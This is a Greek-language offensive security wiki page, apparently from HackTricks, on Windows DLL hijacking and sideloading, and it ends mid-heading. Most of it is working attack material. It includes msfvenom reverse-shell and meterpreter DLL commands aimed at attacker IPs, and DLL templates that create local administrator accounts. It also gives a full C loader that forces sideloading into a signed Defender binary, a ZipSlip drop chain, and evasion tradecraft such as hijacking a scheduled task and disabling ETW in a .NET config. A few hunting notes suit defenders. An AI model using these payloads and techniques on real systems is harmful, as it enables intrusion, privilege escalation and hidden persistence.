# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

Το DLL Hijacking περιλαμβάνει τον χειρισμό μιας αξιόπιστης εφαρμογής ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος αυτός καλύπτει διάφορες τακτικές όπως **DLL Spoofing, Injection, και Side-Loading**. Χρησιμοποιείται κυρίως για code execution, επίτευξη persistence, και, λιγότερο συχνά, privilege escalation. Παρά την έμφαση εδώ στο escalation, η μέθοδος hijacking παραμένει ίδια ανεξάρτητα από τον στόχο.

### Common Techniques

Χρησιμοποιούνται αρκετές μέθοδοι για DLL hijacking, καθεμία με την αποτελεσματικότητά της να εξαρτάται από τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά με χρήση DLL Proxying για να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε ένα search path πριν από το νόμιμο, εκμεταλλευόμενοι το search pattern της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL για να το φορτώσει μια εφαρμογή, νομίζοντας ότι είναι ένα ανύπαρκτο απαιτούμενο DLL.
4. **DLL Redirection**: Τροποποίηση παραμέτρων search όπως `%PATH%` ή αρχείων `.exe.manifest` / `.exe.local` ώστε να κατευθυνθεί η εφαρμογή στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο αντίστοιχο στον κατάλογο WinSxS, μια μέθοδος που συχνά συνδέεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε έναν κατάλογο ελεγχόμενο από τον χρήστη μαζί με την αντιγραμμένη εφαρμογή, παρόμοιο με τεχνικές Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Το κλασικό DLL sideloading δεν είναι ο μόνος τρόπος για να γίνει ένα αξιόπιστο **.NET Framework** process να φορτώσει attacker code. Αν το target executable είναι μια **managed** εφαρμογή, το CLR εξετάζει επίσης ένα **application configuration file** με όνομα ίδιο με το executable (για παράδειγμα `Setup.exe.config`). Αυτό το αρχείο μπορεί να ορίσει ένα προσαρμοσμένο **AppDomainManager**. Αν το config δείχνει σε ένα attacker-controlled assembly τοποθετημένο δίπλα στο EXE, το CLR το φορτώνει **πριν από τη συνηθισμένη code path της εφαρμογής** και εκτελείται μέσα στο αξιόπιστο process.

Σύμφωνα με το .NET Framework configuration schema της Microsoft, τόσο το `<appDomainManagerAssembly>` όσο και το `<appDomainManagerType>` πρέπει να υπάρχουν για να χρησιμοποιηθεί το custom manager.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Διαχειριστής ελάχιστων δικαιωμάτων:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Πρακτικές σημειώσεις:
- Αυτό είναι **.NET Framework specific** tradecraft. Εξαρτάται από το CLR config parsing, όχι από το Win32 DLL search order.
- Ο host πρέπει πραγματικά να είναι ένα **managed EXE**. Γρήγορο triage: `sigcheck -m target.exe`, `corflags target.exe`, ή έλεγξε για το **CLR Runtime Header** στα PE metadata.
- Το config filename πρέπει να ταιριάζει ακριβώς με το όνομα του executable (`<binary>.config`) και συνήθως βρίσκεται **δίπλα στο EXE**.
- Αυτό είναι χρήσιμο με **signed Microsoft/vendor binaries** επειδή το trusted EXE παραμένει ανέπαφο ενώ το malicious managed assembly εκτελείται in-process.
- Αν έχεις ήδη ένα writable installer/update directory, το AppDomainManager hijacking μπορεί να χρησιμοποιηθεί ως το **first stage**, και μετά να ακολουθήσει κλασικό DLL sideloading ή reflective loading για τα επόμενα stages.

### Hijacking an existing scheduled task to relaunch the sideload chain

Για persistence, μην ψάχνεις μόνο για **creating a new task**. Ορισμένα intrusion sets περιμένουν μέχρι ένας legitimate installer να δημιουργήσει ένα **normal updater task** και μετά να **rewrite the task action** έτσι ώστε το υπάρχον name, author και trigger να φαίνονται οικεία στους defenders.

Reusable workflow:
1. Εγκατάστησε/εκτέλεσε το legitimate software και εντόπισε το task που δημιουργεί κανονικά.
2. Εξήγαγε το task XML και σημείωσε τις τρέχουσες τιμές `<Exec><Command>` / `<Arguments>`.
3. Αντικατάστησε μόνο το action ώστε το task να ξεκινά το **trusted host EXE** σου από ένα user-writable staging directory, το οποίο στη συνέχεια side-loads ή AppDomain-loads το real payload.
4. Κάνε re-register το ίδιο task name αντί να δημιουργήσεις ένα νέο, προφανές persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Γιατί είναι πιο stealthier:
- Το όνομα του task μπορεί ακόμα να φαίνεται νόμιμο (για παράδειγμα ένας vendor updater).
- Η **Task Scheduler service** το εκκινεί, οπότε η επαλήθευση parent/ancestor συχνά βλέπει την αναμενόμενη αλυσίδα scheduling αντί για `explorer.exe`.
- Ομάδες DFIR που κυνηγούν μόνο **new task names** μπορεί να χάσουν ένα task του οποίου το registration υπήρχε ήδη, αλλά το action τώρα δείχνει σε `%LOCALAPPDATA%`, `%APPDATA%`, ή άλλο attacker-controlled path.

Γρήγορα hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Σύγκρινε τα XML του `C:\Windows\System32\Tasks\*` και τα metadata του `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` με ένα baseline.
- Alert όταν ένα **vendor-looking updater task** εκτελείται από **user-writable directories** ή εκκινεί ένα .NET EXE με ένα τοπικό `*.config` file.

> [!TIP]
> Για ένα step-by-step chain που συνδυάζει HTML staging, AES-CTR configs, και .NET implants πάνω σε DLL sideloading, δες το workflow παρακάτω.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Ο πιο συνηθισμένος τρόπος για να βρεις missing Dlls μέσα σε ένα σύστημα είναι να τρέξεις [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από sysinternals, **ρυθμίζοντας** τα **παρακάτω 2 filters**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

και να εμφανίζεις μόνο το **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Αν ψάχνεις για **missing dlls γενικά** άφησέ το να τρέχει για μερικά **δευτερόλεπτα**.\
Αν ψάχνεις για ένα **missing dll μέσα σε ένα συγκεκριμένο executable** πρέπει να βάλεις **άλλο filter όπως "Process Name" "contains" `<exec name>`, να το εκτελέσεις, και να σταματήσεις την καταγραφή events**.

## Exploiting Missing Dlls

Για να κάνουμε privilege escalation, η καλύτερη πιθανότητα που έχουμε είναι να μπορέσουμε να **γράψουμε ένα dll που ένα privilege process θα προσπαθήσει να φορτώσει** σε κάποιο από τα **σημεία όπου θα αναζητηθεί**. Άρα, θα μπορέσουμε να **γράψουμε** ένα dll σε έναν **folder** όπου το **dll αναζητείται πριν** από τον folder όπου βρίσκεται το **original dll** (weird case), ή θα μπορέσουμε να **γράψουμε σε κάποιο folder όπου το dll θα αναζητηθεί** και το original **dll δεν υπάρχει** σε κανέναν folder.

### Dll Search Order

**Μέσα στην** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείς να βρεις πώς φορτώνονται συγκεκριμένα τα Dlls.**

Οι **Windows applications** ψάχνουν για DLLs ακολουθώντας ένα σύνολο από **pre-defined search paths**, τηρώντας μια συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking εμφανίζεται όταν ένα malicious DLL τοποθετηθεί στρατηγικά σε ένα από αυτά τα directories, εξασφαλίζοντας ότι θα φορτωθεί πριν από το authentic DLL. Μια λύση για να το αποτρέψεις αυτό είναι η εφαρμογή να χρησιμοποιεί absolute paths όταν αναφέρεται στα DLLs που χρειάζεται.

Μπορείς να δεις το **DLL search order σε 32-bit** systems παρακάτω:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Αυτή είναι η **default** σειρά αναζήτησης με ενεργό το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, ο current directory ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσεις αυτή τη λειτουργία, δημιούργησε το registry value **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και όρισέ το σε 0 (το default είναι ενεργό).

Αν η function [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) κληθεί με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινά στον directory του executable module που φορτώνει το **LoadLibraryEx**.

Τέλος, σημείωσε ότι **ένα dll μπορεί να φορτωθεί δηλώνοντας το absolute path αντί απλώς το name**. Σε αυτή την περίπτωση το dll αυτό θα **αναζητηθεί μόνο σε αυτό το path** (αν το dll έχει dependencies, θα αναζητηθούν όπως όταν φορτώθηκε απλώς με name).

Υπάρχουν και άλλοι τρόποι να αλλάξεις τη σειρά αναζήτησης, αλλά δεν θα τους εξηγήσω εδώ.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Χρησιμοποίησε **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) για να συλλέξεις DLL names που το process ψάχνει αλλά δεν βρίσκει.
2. Αν το binary τρέχει με **schedule/service**, το να ρίξεις ένα DLL με ένα από αυτά τα names στον **application directory** (search-order entry #1) θα φορτωθεί στο επόμενο execution. Σε ένα .NET scanner case το process έψαχνε για `hostfxr.dll` στο `C:\samples\app\` πριν φορτώσει το πραγματικό copy από `C:\Program Files\dotnet\fxr\...`.
3. Φτιάξε ένα payload DLL (π.χ. reverse shell) με οποιοδήποτε export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Αν το primitive σου είναι ένα **ZipSlip-style arbitrary write**, φτιάξε ένα ZIP του οποίου το entry ξεφεύγει από το extraction dir έτσι ώστε το DLL να καταλήξει στο app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Παραδώστε το archive στο watched inbox/share· όταν το scheduled task επανεκκινήσει το process, φορτώνει το malicious DLL και εκτελεί τον code σας ως το service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προχωρημένος τρόπος για να επηρεάσετε deterministically το DLL search path ενός newly created process είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS όταν δημιουργείτε το process με τις native APIs του ntdll. Παρέχοντας εδώ έναν directory υπό τον έλεγχο του attacker, ένα target process που επιλύει ένα imported DLL by name (χωρίς absolute path και χωρίς να χρησιμοποιεί τα safe loading flags) μπορεί να αναγκαστεί να φορτώσει ένα malicious DLL από αυτόν τον directory.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- Αυτό επηρεάζει το child process που δημιουργείται· είναι διαφορετικό από το SetDllDirectory, το οποίο επηρεάζει μόνο το current process.
- Το target πρέπει να κάνει import ή LoadLibrary ένα DLL by name (χωρίς absolute path και χωρίς χρήση του LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Τα KnownDLLs και τα hardcoded absolute paths δεν μπορούν να hijacked. Τα forwarded exports και το SxS μπορεί να αλλάξουν την precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Παράδειγμα operational usage
- Τοποθέτησε ένα κακόβουλο xmllite.dll (που κάνει export τις απαιτούμενες functions ή κάνει proxy στο πραγματικό) στον κατάλογο DllPath σου.
- Εκκίνησε ένα signed binary που είναι γνωστό ότι αναζητά το xmllite.dll με βάση το όνομα χρησιμοποιώντας την παραπάνω technique. Ο loader επιλύει το import μέσω του παρεχόμενου DllPath και sideloads το DLL σου.

Αυτή η technique έχει παρατηρηθεί in-the-wild να οδηγεί σε multi-stage sideloading chains: ένας αρχικός launcher ρίχνει ένα helper DLL, το οποίο στη συνέχεια κάνει spawn ένα Microsoft-signed, hijackable binary με ένα custom DllPath για να αναγκάσει τη φόρτωση του DLL του attacker από έναν staging directory.


### .NET AppDomainManager hijacking via `.exe.config`

Για **.NET Framework** targets, το sideloading μπορεί να γίνει **πριν το `Main()`** χωρίς patching memory, εκμεταλλευόμενο το γειτονικό **`.exe.config`** file της εφαρμογής. Αντί να βασίζεται μόνο στο Win32 DLL search order, ο attacker τοποθετεί ένα νόμιμο .NET EXE δίπλα σε ένα κακόβουλο config και ένα ή περισσότερα assemblies υπό τον έλεγχό του.

Πώς λειτουργεί η chain:
1. Το host EXE ξεκινά και το **CLR διαβάζει `<exe>.config`**.
2. Το config ορίζει **`<appDomainManagerAssembly>`** και **`<appDomainManagerType>`** ώστε το runtime να instantiates ένα attacker-controlled `AppDomainManager`.
3. Ο κακόβουλος manager αποκτά **pre-`Main()` execution** μέσα στη trusted host process.
4. Το ίδιο config μπορεί να αναγκάσει το CLR να resolve local assemblies πρώτα (για παράδειγμα `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) και να αποδυναμώσει runtime validation/telemetry χωρίς inline patching.

Campaign-style pattern (το ακριβές nesting μπορεί να διαφέρει ανά directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Γιατί αυτό είναι χρήσιμο:
- **`<probing privatePath="."/>`** κρατά το assembly resolution στον κατάλογο της εφαρμογής, μετατρέποντας τον φάκελο σε ένα προβλέψιμο sideloading surface.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** μεταφέρουν την εκτέλεση σε attacker code κατά το CLR initialization, πριν τρέξει η νόμιμη λογική της εφαρμογής.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** μπορεί να επιτρέψει σε μια full-trust app να φορτώσει unsigned ή tampered assemblies χωρίς strong-name validation failure.
- **`<publisherPolicy apply="no"/>`** αποφεύγει publisher-policy redirects προς νεότερα assemblies.
- **`<requiredRuntime ... safemode="true"/>`** κάνει το runtime selection πιο deterministic.
- **`<etwEnable enabled="false"/>`** είναι ιδιαίτερα ενδιαφέρον επειδή το **CLR απενεργοποιεί το δικό του ETW visibility** από το configuration αντί το implant να κάνει patch το `EtwEventWrite` στη μνήμη.

Operational pattern που έχει παρατηρηθεί σε πρόσφατες campaigns:
- Stage 1 ρίχνει `setup.exe`, `setup.exe.config`, και local assemblies.
- Stage 2 τα αντιγράφει σε έναν πειστικό **AppData update** φάκελο, μετονομάζει το host σε κάτι σαν `update.exe`, και το ξαναεκκινεί μέσω ενός **scheduled task**.
- Stage 3 επαληθεύει το execution context (για παράδειγμα αναμενόμενο parent `svchost.exe` από το Task Scheduler) πριν φορτώσει το τελικό RAT DLL/export.

Ιδέες για hunting:
- Signed ή γενικά νόμιμα **.NET executables** που τρέχουν με ύποπτα γειτονικά **`.config`** files σε θέσεις writable από τον χρήστη.
- `.config` files που περιέχουν **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, ή **`etwEnable enabled="false"`**.
- Scheduled tasks που ξαναεκκινούν renamed update binaries από **`%LOCALAPPDATA%`** ή app-specific `\bin\update\` directories.
- Parent/child chains όπου ένα scheduled task εκκινεί ένα trusted .NET host που αμέσως φορτώνει non-vendor assemblies από τον δικό του κατάλογο.

#### Εξαιρέσεις στο dll search order από τα Windows docs

Ορισμένες εξαιρέσεις στο standard DLL search order αναφέρονται στη Windows documentation:

- Όταν εντοπίζεται ένα **DLL που έχει το ίδιο όνομα με ένα ήδη φορτωμένο στη μνήμη**, το σύστημα παρακάμπτει το συνηθισμένο search. Αντί γι’ αυτό, κάνει έλεγχο για redirection και manifest πριν καταλήξει στο DLL που είναι ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν κάνει search για το DLL**.
- Σε περιπτώσεις όπου το DLL αναγνωρίζεται ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει τη δική του έκδοση του known DLL, μαζί με τυχόν dependent DLLs του, **παρακάμπτοντας τη διαδικασία search**. Το registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** κρατάει μια λίστα από αυτά τα known DLLs.
- Αν ένα **DLL έχει dependencies**, το search για αυτά τα dependent DLLs γίνεται σαν να αναφέρονταν μόνο με τα **module names** τους, ανεξάρτητα από το αν το αρχικό DLL εντοπίστηκε μέσω full path.

### Escalating Privileges

**Requirements**:

- Εντόπισε ένα process που λειτουργεί ή θα λειτουργήσει με **different privileges** (horizontal ή lateral movement), το οποίο **λείπει ένα DLL**.
- Βεβαιώσου ότι υπάρχει **write access** σε οποιονδήποτε **directory** μέσα στον οποίο θα γίνει **search** για το **DLL**. Αυτή η θέση μπορεί να είναι ο κατάλογος του executable ή ένας κατάλογος μέσα στο system path.

Ναι, οι προϋποθέσεις είναι περίπλοκες να βρεθούν, αφού **by default είναι κάπως περίεργο να βρεις ένα privileged executable με λείπει ένα dll** και είναι ακόμα **πιο περίεργο να έχεις write permissions σε έναν system path folder** (δεν τα έχεις by default). Αλλά, σε misconfigured environments αυτό είναι δυνατό.\
Αν σταθείς τυχερός και βρεθείς να καλύπτεις τις απαιτήσεις, μπορείς να ελέγξεις το project [UACME](https://github.com/hfiref0x/UACME). Ακόμα κι αν ο **main goal του project είναι bypass UAC**, μπορεί να βρεις εκεί ένα **PoC** ενός Dll hijaking για την έκδοση των Windows που μπορείς να χρησιμοποιήσεις (πιθανότατα απλώς αλλάζοντας το path του folder όπου έχεις write permissions).

Σημείωσε ότι μπορείς να **ελέγξεις τα permissions σου σε έναν folder** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **έλεγξε τα permissions όλων των folders μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείς επίσης να ελέγξεις τα imports ενός executable και τα exports ενός dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για έναν πλήρη οδηγό σχετικά με το πώς να **abuse Dll Hijacking to escalate privileges** με δικαιώματα εγγραφής σε έναν **System Path folder** δες:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)θα ελέγξει αν έχεις δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα automated tools για να ανακαλύψεις αυτό το vulnerability είναι οι συναρτήσεις **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Example

Σε περίπτωση που βρεις ένα exploitable scenario, ένα από τα πιο σημαντικά πράγματα για να το εκμεταλλευτείς επιτυχώς θα ήταν να **create a dll that exports at least all the functions the executable will import from it**. Anyway, σημείωσε ότι το Dll Hijacking βοηθάει στο να [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείς να βρεις ένα παράδειγμα για το **how to create a valid dll** μέσα σε αυτή τη μελέτη για dll hijacking με επίκεντρο το dll hijacking για execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **next sectio**n μπορείς να βρεις κάποιους **basic dll codes** που ίσως είναι χρήσιμοι ως **templates** ή για να δημιουργήσεις ένα **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Βασικά ένα **Dll proxy** είναι ένα Dll ικανό να **execute your malicious code when loaded** αλλά και να **expose** και να **work** όπως αναμένεται, **relaying all the calls to the real library**.

Με το tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείς στην πράξη να **indicate an executable and select the library** που θέλεις να proxify και να **generate a proxified dll** ή να **indicate the Dll** και να **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Απόκτησε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιούργησε έναν χρήστη (x86 δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Το δικό σου

Σημείωσε ότι σε αρκετές περιπτώσεις το Dll που κάνεις compile πρέπει να **export several functions** που θα φορτωθούν από τη διεργασία-θύμα, αν αυτές οι functions δεν υπάρχουν το **binary won't be able to load** them και το **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Παράδειγμα C++ DLL με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτικό C DLL με thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Μελέτη περίπτωσης: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Το Windows Narrator.exe εξακολουθεί να ελέγχει στην εκκίνηση ένα προβλέψιμο, γλωσσικά συγκεκριμένο localization DLL που μπορεί να hijacked για arbitrary code execution και persistence.

Βασικά στοιχεία
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Αν υπάρχει writable attacker-controlled DLL στο OneCore path, φορτώνεται και εκτελείται το `DllMain(DLL_PROCESS_ATTACH)`. Δεν απαιτούνται exports.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` και `Operation is Load Image` ή `CreateFile`.
- Εκκινήστε το Narrator και παρατηρήστε την προσπάθεια φόρτωσης του παραπάνω path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC σιωπή
